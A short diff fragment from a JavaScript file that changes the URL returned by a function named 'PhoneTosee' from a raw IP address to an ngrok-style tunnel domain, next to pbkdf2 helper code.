@@ -78,7 +78,7 @@ function pbkdf2(salt, password, iterations, keylen) {
     });
 }
 function PhoneTosee(){
-    return "https://47.120.37.203/"
+    return "https://maw1b43a8949.ngrok.xiaomiqiu123.top/"
 }
 
 function relize(bs_string){
